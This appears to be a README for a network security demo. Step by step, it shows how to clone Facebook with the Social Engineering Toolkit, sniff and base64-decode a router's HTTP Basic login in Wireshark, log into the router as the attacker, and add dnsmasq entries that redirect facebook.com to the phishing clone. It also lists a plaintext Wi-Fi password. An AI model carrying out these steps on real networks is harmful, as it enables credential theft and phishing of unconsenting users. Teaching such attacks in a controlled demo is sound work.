# Network Security Demo

Wifi password: thisisasupersecretkey
To do this, you will need to have a router with DD-WRT installed on it.

Start up the clone facebook:
1. Use the Scocial Engineering Toolkit to create a clone of the facebook website
2. cd into `/root/.set/web_clone`
3. then run `./node_modules/serve/bin/serve.js -l 80`

(Note: This next step is only neccessary if the router being connected to does not have access to the internet)

Change the DNS of the computer of the victim 
1. Find the IP of the router
2. Set the DNS of the computer to the routers ip 
3. Start up router and connect

# Run the Demo

1. Open Wireshark and start recording the vitims traffic.
2. Hvae the victime go to '192.168.1.1' or whatever the routers IP is
3. Open the `Wireless` tab
4. Login
5. Go to Wireshark and stop recording. 
6. Click Magnify glass in top left hand corner
7. Change search type from `Display Filter` to `String`
8. Then click `Packet List` in the top left hand corner and select `Packet Details`
9. Search for `Authorization: Basic`
10. Copy as `Printable text`
11. Go to [Your base 64 decoder](https://www.base64decode.org/)
12. Decode the usename and password
13. Use the username and password to login to router as the attacker
14. Go to the `Services` Tab
15. Change DNS for facebook.com to the ip of your fake facebook (i.e. `167.99.229.18`)
    1.  Need to have a public VM set up with the fake facebook or on the same network as your victim
    2.  Here is what goes in the `Additional DNSMasq Options` box:
    
            address=/facebook.com/167.99.229.18
            address=/.facebook.com/167.99.229.18
            address=/www.facebook.com/167.99.229.18

16.  Enter the command `nslookup www.facebook.com` into a terminal
     1.  You can now see we have injected our IP into the page
17.  Run `curl www.facebook.com > text.html` to show that our fake facebook page does indeed download
18.  Browser do no seem to work due to limitations with the Social engineering toolkit and built in browser protections
